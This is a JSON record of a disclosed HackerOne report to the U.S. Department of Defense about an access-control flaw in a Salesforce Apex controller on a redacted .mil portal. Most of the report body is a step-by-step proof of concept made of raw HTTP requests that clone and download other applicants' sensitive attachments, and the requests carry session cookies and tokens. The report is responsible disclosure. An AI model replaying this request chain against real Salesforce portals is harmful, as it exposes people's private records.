@@ -1,0 +1,118 @@
+{
+  "id": 2950536,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yOTUwNTM2",
+  "url": "https://hackerone.com/reports/2950536",
+  "title": "Applicant security exam Attachments/Documents accessible through an IDOR/BAC on the custom Apex controller on https://█████.mil ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2025-01-20T16:46:59.161Z",
+  "submitted_at": "2025-01-20T16:46:59.322Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "oxylis",
+    "url": "/oxylis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/d5tcmadvnirjayyd3r31jvr9ios3/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16064,
+    "url": "https://hackerone.com/deptofdefense",
+    "handle": "deptofdefense",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/064/46cd0286b1fa224aaa2cb9dfaaca9fa22b5b80b2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "U.S. Dept Of Defense",
+      "twitter_handle": "DC3VDP",
+      "website": "https://bit.ly/3ntULtN",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-02-12T20:55:26.602Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-01-30T20:20:08.870Z",
+  "team_member_agreed_on_going_public_at": "2025-02-12T20:55:26.315Z",
+  "comments_closed?": true,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Greetings DoD team,\n\nI've uncovered a highly dangerous IDOR on the ██████████ portal.\n\nAn attacker can switch the ownership of any Attachment record submitted through the portal and access the files. These contain highly sensitive information as they include all materials/documentation submitted as part of the vetting procedures prior to visiting the █████, e.g. personal medical records. Potentially this might include internal attachments as well.\n\nAn attacker is able to exploit the following chain:\n\n1. Generate/enumerate a list of Salesforce Attachment Id's. These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.\n2. Plug the generated list of Id's into the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment), clone any Attachment record within the CRM and link it to a record they own (e.g. their own Contact). This gives read access to the record. \n3. Download the newly-linked Attachment as their own via a servlet/servlet.FileDownload?file=* request.\n\n**IMPORTANT NOTE: unfortunately during testing inadvertent access was gained to a confidential record (https://██████████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MaT3MAK). Please remove the link to the test Contact as a matter of urgency. Apologies!**\n\n## Impact\n\nHigh-impact sensitive data leak.\n\n## System Host(s)\n██████.mil\n\n## Affected Product(s) and Version(s)\n\n\n## CVE Numbers\n\n\n## Steps to Reproduce\n#  Steps to reproduce/POC\n\n1. Create a new ███████ request: https://███████.mil/Portal██████/s/████████-creation\n2. After submitting the form, verify the account by following the link received in email (Welcome to Your ████████ Reservation Portal My████s Account...)\n3. After changing the password and logging into ██████.mil/Portal████/s/, find any POST request with aura.token present in the HTTP traffic, e.g:\n\n```\nPOST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\nHost: █████.mil\nCookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://█████.mil/Portal█████/s/\nX-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\nX-Sfdc-Request-Id: 1650000000ce00391b\nX-Sfdc-Page-Cache: 05da72b5c160b86c\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nX-B3-Traceid: bb38cda3039f713b\nX-B3-Spanid: 2e48fc5f161b8aa4\nX-B3-Sampled: 0\nContent-Length: 1310\nOrigin: https://█████████.mil\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nmessage=%7B%22actions%22%3A%5B%7B%22id%22%3A%2294%3Ba%22%2C%22descriptor%22%3A%22serviceComponent%3A%2F%2Fui.comm.runtime.components.aura.components.siteforce.controller.PubliclyCacheableAttributeLoaderController%2FACTION%24getComponentAttributes%22%2C%22callingDescriptor%22%3A%22markup%3A%2F%2Fsiteforce%3ApageLoader%22%2C%22params%22%3A%7B%22viewOrThemeLayoutId%22%3A%22c2a69af8-e08e-4cc8-a677-d55b0ca0fa94%22%2C%22publishedChangelistNum%22%3A91%2C%22audienceKey%22%3A%22ClyOkxQ47tauZ_s9udPOFA%22%7D%2C%22version%22%3A%2262.0%22%2C%22storable%22%3Atrue%7D%5D%7D&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\n```\n\n4. Send the request to Repeater, modify as below and send. This will pull some info from your own Contact record. Save the Contact Id (003Rw000002SJcsIAG in my case)\n\n```\nPOST /Portal█████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\nHost: █████.mil\nCookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://█████.mil/Portal█████████/s/\nX-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\nX-Sfdc-Request-Id: 1650000000ce00391b\nX-Sfdc-Page-Cache: 05da72b5c160b86c\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nX-B3-Traceid: bb38cda3039f713b\nX-B3-Spanid: 2e48fc5f161b8aa4\nX-B3-Sampled: 0\nContent-Length: 1115\nOrigin: https://██████.mil\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nmessage={\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"Contact\",\"layoutType\":\"FULL\",\"pageSize\":2000,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal██████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\n```\n\n█████████\n\n5. Modify the request again as below, setting the value of parentId as as your Contact Id extracted in previous step and attachmentId as 00PRw000000MaT3MAK:\n\n```\nPOST /Portal█████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\nHost: █████.mil\nCookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://███████.mil/Portal███████/s/\nX-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\nX-Sfdc-Request-Id: 1650000000ce00391b\nX-Sfdc-Page-Cache: 05da72b5c160b86c\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nX-B3-Traceid: bb38cda3039f713b\nX-B3-Spanid: 2e48fc5f161b8aa4\nX-B3-Sampled: 0\nContent-Length: 999\nOrigin: https://███████.mil\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nmessage={\"actions\":[{\"id\":\"20;a\",\"descriptor\":\"apex://ExAM.FileUploadController/ACTION$cloneAttachment\",\"callingDescriptor\":\"markup://ExAM:AssessmentViewer\",\"params\":{\"attachmentId\":\"00PRw000000MaT3MAK\",\"parentId\":\"003Rw000002SJcsIAG\"},\"version\":null}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal█████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\n```\n█████\n\n6. Modify request again and send, this time calling all accessible Attachment records. Note that a new file has just been cloned/created, copy the Id: 00PRw000000MbSLMA0.\n\n```\nPOST /Portal████████/s/sfsites/aura?r=1&ui-comm-runtime-components-aura-components-siteforce-controller.PubliclyCacheableAttributeLoader.getComponentAttributes=1 HTTP/2\nHost: ██████.mil\nCookie: renderCtx=%7B%22pageId%22%3A%22fec421fb-ebfc-431f-978d-a365adcfcb5c%22%2C%22schema%22%3A%22Published%22%2C%22viewType%22%3A%22Published%22%2C%22brandingSetId%22%3A%223c2a3bc4-0bc0-4c5c-8f55-7ae185109706%22%2C%22audienceIds%22%3A%226Au83000000003R%2C6Au83000000003M%22%7D; CookieConsentPolicy=0:1; LSKey-c$CookieConsentPolicy=0:1; BrowserId=oMjkwsU6Ee-I00kJsX5jcA; pctrk=206f938e-92be-4123-812c-7636ca87745f; oinfo=c3RhdHVzPUFDVElWRSZ0eXBlPTImb2lkPTAwRHQwMDAwMDAwUE16bg==; autocomplete=1; oid=00Dt0000000PMzn; sid=00Dt0000000PMzn!AQEAQOLKvWlH87RxyW9N_gumGxPew3nc7awAoLfDbhliBEaC6HRUyzcfI0buw465cwES7za7d6WuFGxuivxJhqW4_4bM5PjI; sid_Client=w000000E5Sr0000000PMzn; clientSrc=81.97.122.40; inst=APP_Rw; __Secure-has-sid=1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: https://████████.mil/Portal██████/s/\nX-Sfdc-Page-Scope-Id: cb3e874d-dd6f-4459-8016-91cb97c034bb\nX-Sfdc-Request-Id: 1650000000ce00391b\nX-Sfdc-Page-Cache: 05da72b5c160b86c\nContent-Type: application/x-www-form-urlencoded;charset=UTF-8\nX-B3-Traceid: bb38cda3039f713b\nX-B3-Spanid: 2e48fc5f161b8aa4\nX-B3-Sampled: 0\nContent-Length: 1118\nOrigin: https://███.mil\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\nmessage={\"actions\":[{\"id\":\"123;a\",\"descriptor\":\"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems\",\"callingDescriptor\":\"UNKNOWN\",\"params\":{\"entityNameOrId\":\"Attachment\",\"layoutType\":\"FULL\",\"pageSize\":2000,\"currentPage\":0,\"useTimeout\":false,\"getCount\":false,\"enableRowActions\":false}}]}&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22eUNJbjV5czdoejBvRlA5OHpDU1dPd1pMVExBQkpJSlVFU29Ba3lmcUNLWlE5LjMyMC4y%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%221184_AgcTXn_6dZSShHXZ2PZsug%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Atrue%7D&aura.pageURI=%2FPortal████████%2Fs%2F&aura.token=eyJub25jZSI6Ilh5VUlXTVhkNmlMLVVVSGE4UHgtNVpYcXNHTExpcHh1VHpsdGY0ZUxMX0lcdTAwM2QiLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IntcInRcIjpcIjAwRFJ3MDAwMDAwMDAwMVwiLFwidlwiOlwiMDJHUncwMDAwMDAwMDNGXCIsXCJhXCI6XCJjYWltYW5zaWduZXJcIn0iLCJjcml0IjpbImlhdCJdLCJpYXQiOjE3MzczOTAwMTE5MTEsImV4cCI6MH0%3D..WK5LFyXjvujGvkxNWDVZyUQQsRhVRCcTD_hkWdulEWA%3D\n```\n████████\n\n7. Insert the ID into URL as below (same session) and verify that file is accessible from your account:\n\nhttps://█████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MbSLMA0\n\n\n# Notes\n\nTo ease testing on your side, I am also attaching a list of Attachment Id's that I generated using the method mentioned in the beginning of the report.\n\nHope you find this report helpful - look forward to your feedback.\n\n## Suggested Mitigation/Remediation Actions\n\n\n",
+  "weakness": {
+    "id": 26,
+    "name": "Improper Access Control - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 139,
+  "voters": [
+    "neat_panda",
+    "aboalezz",
+    "loaymorad",
+    "terminallogic",
+    "0xaurora",
+    "2buggy",
+    "pippybear",
+    "nakyamad",
+    "almuntadhar0x01",
+    "capablanca0",
+    "and 129 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
